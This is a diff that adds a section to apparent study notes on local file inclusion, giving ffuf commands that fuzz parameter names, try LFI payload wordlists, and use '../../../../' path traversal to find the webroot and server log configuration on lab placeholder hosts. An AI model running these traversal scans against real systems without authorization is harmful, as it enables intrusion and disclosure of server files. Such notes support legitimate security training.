@@ -348,3 +348,11 @@ Now, to read the Apache Server Logs, we can try to visit to a website like : `ht
 
 
 ## Fuzzing Parameters
+FFuF can be used for fuzzing the parameter names that can be manipulated : `ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287`
+
+A good LFI Wordlist is LFI-Jhaddix.txt, to use it we need to type in the following command : `ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287`
+
+To know about Server Webroot, we can FFuF that easily using the command   : `ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287`
+
+To find the server log configuration, we can use the command : `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287`
+
